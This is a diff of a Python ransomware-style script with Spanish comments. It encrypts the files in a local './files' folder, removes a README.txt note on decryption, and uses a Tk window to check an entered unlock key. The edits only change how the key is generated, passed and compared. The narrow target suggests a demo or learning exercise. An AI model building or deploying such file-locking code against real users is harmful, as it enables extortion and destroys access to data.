@@ -35,7 +35,7 @@ def encrypt(items, key):
             file.write(encrypted_data)
 
 
-def encrypt_files():
+def encrypt_files(key):
     path_to_encrypt = './files'
     #items = os.listdir(path_to_encrypt)
     #full_path = [path_to_encrypt + '/' + item for item in items]
@@ -43,7 +43,7 @@ def encrypt_files():
     full_path = [f for f in full_path if os.path.isfile(f)] # Saco las carpetas de la lista
     # generate_key()
     # key = load_key()
-    key = generate_key()
+    # key = generate_key()
 
     encrypt(full_path, key)
 
@@ -88,8 +88,8 @@ def decrypt_files(input_key):
     # key = load_key()
     # print(key.decode('UTF-8'))
     
-    # if key.decode('UTF-8') != input_key:
-    #   return False
+    if key != input_key.encode('utf-8'):
+        return False
     
     path_to_encrypt = './files'
     os.remove(path_to_encrypt + '/' + 'README.txt')
@@ -109,8 +109,8 @@ def decrypt_files(input_key):
 # ************************ PANTALLA ******************************
 
 def verify_key():
-  key = entry.get()
-  ret = decrypt_files(key);
+  input = entry.get()
+  ret = decrypt_files(input);
   
   if ret: 
     label4.config(text = 'Se desencriptaron los archivos')
@@ -121,7 +121,8 @@ def verify_key():
   
   
 if __name__ == '__main__':
-  encrypt_files();
+  key = generate_key() 
+  encrypt_files(key);
   
   win = Tk()
   win.geometry("450x300")
